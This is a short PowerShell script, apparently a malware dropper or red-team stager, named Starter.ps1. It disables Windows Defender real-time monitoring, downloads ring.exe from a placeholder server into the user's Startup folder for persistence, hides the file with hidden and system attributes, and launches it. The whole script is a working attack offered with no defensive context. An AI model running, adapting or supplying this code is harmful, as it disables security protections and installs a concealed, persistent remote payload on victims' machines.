# Starter.ps1

# Disable Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Get the Startup folder path
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$target = Join-Path $startup "ring.exe"

# Download ring.exe to the Startup folder
Invoke-WebRequest -Uri "http://<Server_IP>/tools/ring.exe" -OutFile $target

# Hide the file (set attributes to Hidden and System)
attrib +h +s $target

# Run the payload (doesn't require admin if ring.exe is non-privileged)
Start-Process $target

# Print completion message
Write-Output "Done."

# Sleep for a few seconds before closing the terminal
Start-Sleep -Seconds 3
exit
